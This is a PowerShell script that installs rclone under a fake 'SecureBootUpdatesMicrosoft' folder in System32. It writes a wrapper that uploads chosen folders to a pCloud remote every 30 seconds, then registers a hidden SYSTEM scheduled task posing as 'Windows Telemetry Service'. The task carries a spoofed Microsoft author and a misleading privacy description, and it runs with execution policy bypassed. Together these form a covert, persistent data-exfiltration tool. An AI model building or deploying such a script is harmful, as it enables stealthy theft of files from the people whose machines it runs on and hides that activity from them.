#----Variabes start here.
$rclonedlurl = "https://edef12.pcloud.com/cfZQ29UDWZJgIuO6ZydhbZZyqjb7kZ2ZZanFZZqTAh7Zx0Zb5ZvHZiVZWHZB0Z35ZW5ZOHZzVZRzZJVZi0ZNkZ80xJjWSaSyLc9Gdj2saqUYIFLUrk/Rclone.zip"
$rootpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
$rclonezip = Join-Path -Path $rootpath -ChildPath "Rclone.zip"
$rcloneexepath = Join-Path -Path $rootpath -ChildPath "rclone.exe"
$rcloneconfigfile = Join-Path -Path $rootPath -ChildPath "rc.conf"
$syncledgerfile = Join-Path -Path $rootPath -ChildPath "syncledger"
$rclonetask = "Windows Telemetry Service"
$wrapperdestination = "$rootpath\RcloneWrapper.ps1"
#----Variables end.

#----Global functions start here.
#Function to add a/b variants to a scenerio.
function Get-YesOrNo {
    param (
        [string]$fillervar
    )
    do {
        $input = Read-Host "Do you want to modify existent $fillervar file? (y/n)"
    } while ($input -ne "y" -and $input -ne "n")
    return $input
}
#Function to get folder path and add additional folders to ledger.
function Get-FolderPath {
    do {
        $destination = Read-Host "Please provide destination path (folder path)"
        if (-not (Test-Path $destination)) {
            Write-Host "The specified folder does not exist. Please provide a valid folder path."
        }
    } while (-not (Test-Path $destination))
    return $destination
}
#----Functions end.
#----Main script begins here.
#Cleanup
$taskspirit = "Cleanup"
$option = Read-Host "Proceed With $taskspirit? (y/n)::"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {
    Write-Host "Proceeding with $taskspirit..."
    if (Test-Path "$rootpath\Rclone") {
        Get-Process -Name "Rclone" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    else {
        Write-Host "Rclone directory does not exist."
    }
    if (Get-Process -Name "Rclone" -ErrorAction SilentlyContinue) {
        Write-Host "All instances of Rclone.exe have been terminated."
    }
    else {
        Write-Host "No instances of Rclone.exe are currently running."
    }
    if (Test-Path "$rootpath\Rclone") {
        Remove-Item -Path "$rootpath\Rclone" -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
    }
    else {
        Write-Host "Rclone directory does not exist."
    }
    if (Get-ScheduledTask -TaskName $rclonetask -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $rclonetask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    }
    else {
        Write-Host "Scheduled task '$rclonetask' does not exist."
    }
} else {}

##Directory creation and download section.
$taskspirit = "Directory creation & Dl"
$option = Read-Host "Proceed With $taskspirit? (y/n)::"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {
    Write-Host "Proceeding with $taskspirit..."
    if (-not (Test-Path -Path $rcloneexepath -PathType Leaf)) {
        if (-not (Test-Path -Path $rootpath -PathType Container)) {
            New-Item -ItemType Directory -Path $rootpath -Force
        }
        Invoke-WebRequest -Uri $rclonedlurl -OutFile $rclonezip
        Expand-Archive -Path $rclonezip -DestinationPath $rootpath -Force
        Remove-Item -Path $rclonezip -Force
    }
    else {
        Write-Host "rclone.exe already exists. Skipping download."
    }
} else {}

##Creationg wrapper script.
$taskspirit = "Wrapper creation"
$option = Read-Host "Proceed With $taskspirit? (y/n)::"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {
    Write-Host "Proceeding with $taskspirit..."
$wrappercontent = @'
$rootpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
$rcloneexe = Join-Path -Path $rootpath -ChildPath "rclone.exe"
$ledgerpath = Join-Path -Path $rootpath -ChildPath "syncledger"
$rcloneconfig = Join-Path -Path $rootpath -ChildPath "rc.conf"
$clouddrive = "remsync"
$cdpath = "test"
function SyncWithRclone {
    $syncDirectories = Get-Content $ledgerpath
    foreach ($directory in $syncDirectories) {
        & $rcloneexe --config $rcloneconfig sync "$directory" "${clouddrive}:$cdpath"
    }
}
while ($true) {
    SyncWithRclone
    Start-Sleep -Seconds 30
}
'@
$wrappercontent | Out-File -FilePath $wrapperdestination -Encoding UTF8
} else {}

#Rc.conf - file containing remote cloud configuration for rclone.exe.
$taskspirit = "creation/modif of rc.conf(rclone config)"
$option = Read-Host "Proceed With $taskspirit? (y/n)::"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {
    Write-Host "Proceeding with $taskspirit..."
    $fillervar = "rc.conf"
    if (Test-Path $rcloneconfigfile) {
        $viewOldFile = Read-Host "The rc.conf file already exists. Do you want to view its contents? (yes/no)"
        if ($viewOldFile -eq "yes") {
            Write-Host "Contents of rc.conf file:"
            Get-Content $rcloneconfigfile
            do {
                $continue = Get-YesOrNo -fillervar $fillervar
                if ($continue -eq "no") {
                    Write-Host "Continuing without creating a new file."
                    exit
                }
            } while ($continue -ne "yes")
        }
        else {
            Write-Host "Continuing without viewing the old file."
        }
    }
    if ($continue -eq "yes" -or -not (Test-Path $rcloneconfigfile)) {
        $token = Read-Host "Please enter your token:"
        $rcConfContent = @"
[remsync]
type = pcloud
hostname = eapi.pcloud.com
token = {"access_token":"$token","token_type":"bearer","expiry":"0001-01-01T00:00:00Z"}
"@
        $rcConfContent | Out-File -FilePath $rcloneconfigfile -Encoding UTF8
        Write-Host "New rc.conf file has been created at: $rcloneconfigfile"
    }
} else {}

#Syncledger - the file that contains path to what is going to be synced creation.
$taskspirit = "creation/modif of sync(syncledger)"
$option = Read-Host "Proceed With $taskspirit? (y/n)::"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {
    Write-Host "Proceeding with $taskspirit..."
    $fillervar = "SyncLedger"
    if (Test-Path $syncledgerfile) {
        $viewOldFile = Read-Host "A syncledger file already exists. Do you want to view its contents? (yes/no)"
        if ($viewOldFile -eq "yes") {
            Write-Host "Contents of syncledger file:"
            Get-Content $syncledgerfile
            do {
                $continue = Read-Host "Do you want to continue with creating a new file and deleting the old file? (yes/no)"
                if ($continue -eq "no") {
                    Write-Host "Continuing without creating a new file."
                    break
                }
            } while ($continue -ne "yes")
        }
        else {
            Write-Host "Continuing without viewing the old file."
        }
    }
    if ($continue -eq "yes" -or -not (Test-Path $syncledgerfile)) {
        $destinations = @()
        do {
            $destination = Get-FolderPath
            $destinations += $destination
            $choice = Get-YesOrNo -fillervar $fillervar
        } while ($choice -eq "yes")
        $destinations | ForEach-Object {
            $_ -replace '\\', '/' | Out-File -FilePath $syncledgerfile -Append -Encoding UTF8
        }
        Write-Host "Syncledger file has been created at: $syncledgerfile"
    }
} else {}

#Windows Task Creation for rclone continuous sync.
$taskspirit = "sync task creation for rclone.exe"
$option = Read-Host "Proceed With $taskspirit? (y/n)::"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {
    Write-Host "Proceeding with $taskspirit..."
    $taskxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-13T00:56:52.6271595</Date>
    <Author>Microsoft\System</Author>
    <Description>Microsoft doesn't collect any personal data from the customers. We only listen to events that would help diagnostics.</Description>
    <URI>\Windows Telemetry Service</URI>
  </RegistrationInfo>
  <Triggers>
    <EventTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <RegistrationTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Delay>PT1M</Delay>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone\RcloneWrapper.ps1"</Arguments>
      <WorkingDirectory>C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@
# Register the task from the XML content
if (Get-ScheduledTask -TaskName $rclonetask -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $rclonetask -Confirm:$false
} else {}
Register-ScheduledTask -Xml $taskxml -TaskName $rclonetask | Out-Null
Start-ScheduledTask -TaskName $taskxml
} else {}